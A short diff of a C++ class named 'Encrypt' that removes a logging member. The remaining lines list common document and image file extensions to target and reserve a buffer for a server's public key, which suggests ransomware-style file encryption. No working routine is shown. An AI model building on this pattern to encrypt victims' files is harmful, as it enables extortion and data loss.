@@ -7,7 +7,6 @@ namespace Amendux {
 	class Encrypt
 	{
 	private:
-		std::wofstream log;
 		const char *extensions[10] = { "doc", "docx", "jpg", "png", "xls", "xlsx", "ppt", "pptx", "txt" };
 
 		unsigned char serverPublicKey[crypto_box_PUBLICKEYBYTES];
